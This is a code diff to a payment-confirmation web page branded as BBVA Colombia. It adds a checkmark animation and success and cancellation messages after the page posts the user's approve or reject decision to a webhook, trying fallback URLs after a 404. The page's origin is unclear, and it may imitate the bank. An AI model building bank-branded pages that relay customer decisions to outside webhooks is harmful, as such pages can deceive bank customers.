@@ -148,6 +148,99 @@
             padding-top: 16px;
         }
 
+        /* Modal de animación */
+        #animationModal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 200;
+            justify-content: center;
+            align-items: center;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+
+        #animationModal.show {
+            display: flex;
+        }
+
+        .animation-container {
+            background: var(--bbva-white);
+            border-radius: 12px;
+            padding: 40px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .checkmark-circle {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: var(--bbva-aqua);
+            position: relative;
+            animation: scaleUp 0.6s ease-out;
+        }
+
+        .checkmark {
+            width: 80px;
+            height: 80px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .checkmark-path {
+            stroke: var(--bbva-white);
+            stroke-width: 8;
+            fill: none;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            animation: drawCheckmark 0.8s ease-out forwards;
+            animation-delay: 0.2s;
+        }
+
+        @keyframes scaleUp {
+            0% {
+                transform: scale(0);
+                opacity: 0;
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        @keyframes drawCheckmark {
+            0% {
+                stroke-dasharray: 100;
+                stroke-dashoffset: 100;
+                opacity: 0;
+            }
+            50% {
+                opacity: 1;
+            }
+            100% {
+                stroke-dasharray: 100;
+                stroke-dashoffset: 0;
+                opacity: 1;
+            }
+        }
+
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+            }
+            100% {
+                opacity: 1;
+            }
+        }
+
     </style>
 </head>
 
@@ -175,6 +268,17 @@
 
             <div class="footer">
                 &copy; 2024 BBVA Colombia S.A.
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal de animación de confirmación -->
+    <div id="animationModal">
+        <div class="animation-container">
+            <div class="checkmark-circle">
+                <svg class="checkmark" viewBox="0 0 52 52">
+                    <polyline class="checkmark-path" points="14,27 22,35 38,19"></polyline>
+                </svg>
             </div>
         </div>
     </div>
@@ -211,7 +315,34 @@
                     });
 
                     if (response.ok) {
-                        alert('¡BBVA: Pago ' + estado + ' registrado!');
+                        // Mostrar animación solo si es APROBADO
+                        if (estado === 'APROBADO') {
+                            const animationModal = document.getElementById('animationModal');
+                            animationModal.classList.add('show');
+
+                            // Esperar 4 segundos antes de mostrar el mensaje
+                            await new Promise(resolve => setTimeout(resolve, 4000));
+
+                            // Ocultar animación
+                            animationModal.classList.remove('show');
+
+                            // Mostrar mensaje de éxito
+                            document.querySelector('.content').innerHTML = `
+                                <div style="color: var(--bbva-navy); padding: 40px 0;">
+                                    <h3 style="margin-top:20px; font-size: 18px;">¡Pago Confirmado!</h3>
+                                    <p style="margin-top:10px; color:#666;">La transacción ha sido procesada correctamente.</p>
+                                </div>
+                            `;
+                        } else {
+                            // Para rechazados, mostrar directo sin animación
+                            document.querySelector('.content').innerHTML = `
+                                <div style="color: #666; padding: 40px 0;">
+                                    <h3 style="margin-top:20px;">Transacción Cancelada</h3>
+                                    <p style="margin-top:10px;">Has rechazado la operación.</p>
+                                </div>
+                            `;
+                            alert('¡BBVA: Pago ' + estado + ' registrado!');
+                        }
                         return; // Salir si fue exitoso
                     } else if (response.status === 404) {
                         console.log('URL no encontrada:', WEBHOOK_URL, '- Intentando siguiente...');
